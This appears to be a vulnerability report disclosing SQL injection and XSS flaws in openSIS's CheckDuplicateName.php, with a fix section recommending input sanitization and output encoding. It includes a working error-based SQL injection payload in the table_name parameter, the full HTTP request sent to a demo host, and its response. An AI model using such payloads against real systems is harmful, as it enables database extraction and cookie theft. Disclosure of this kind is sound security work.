| Description Due to lack of protection, parameters `table_name`, `field_name`, `id`, `field_id` can be abused to injection SQL queries to extract information from databases some other SQLi tricks, parameter `msg` can be used to inject XSS payload and steal user's cookie (and even takeover user's account) [Screenshot from 2021-09-05 14-45-56(1)](https://user-images.githubusercontent.com/35491855/132119553-61eec465-0e9f-4276-bd86-aa278de2338d.jpg)  As we can see, no security mechanism was implemented which resulted in a lot of vulnerabilities. Exploiting [Screenshot from 2021-09-05 14-51-24](https://user-images.githubusercontent.com/35491855/132120089-1ba16847-7260-4872-ad53-c8d6c7c39901.jpg)  **Injection point**: `HTTP://demo/CheckDuplicateName.php?table_name=api_info+where+id=1+and+extractvalue(0x0a,concat(0x0a,(select+database())))--&field_name=&val=&field_id=&msg=`  In beneath, I've presented how information can be extracted via SQL injection. XSS can be exploited by giving the correct information in other parameters and inject Javascript code in `field_name`, `msg`.  **Request:**  ``` GET /CheckDuplicateName.php?table_name=api_info+where+id=1+and+extractvalue(0x0a,concat(0x0a,(select+database())))--&field_name=&val=&field_id=&msg= HTTP/1.1 Host: demo.opensis.com User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:89.0) Gecko/20100101 Firefox/89.0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8 Accept-Language: en-US,en;q=0.5 Accept-Encoding: gzip, deflate Connection: keep-alive Cookie: PHPSESSID=iadm2hjbvs4vqmskk07vcpp8n5; miniSidebar=0 Upgrade-Insecure-Requests: 1  ```  **Response:**  ``` HTTP/1.1 200 OK Date: Sun, 05 Sep 2021 07:59:18 GMT Server: Apache/2.4.7 (Ubuntu) X-Powered-By: PHP/5.5.9-1ubuntu4.29 Expires: Thu, 19 Nov 1981 08:52:00 GMT Cache-Control: no-store, no-cache, must-revalidate, post-check=0, pre-check=0 Pragma: no-cache Vary: Accept-Encoding Content-Encoding: gzip Content-Length: 716 Keep-Alive: timeout=5, max=100 Connection: Keep-Alive Content-Type: text/htmlx  ``` Solution Add security functions such as `sqlSecurityFilter` to sanitize parameters before processing or printing out to the screen. For XSS, use `htmlentities` to properly encode the output. |
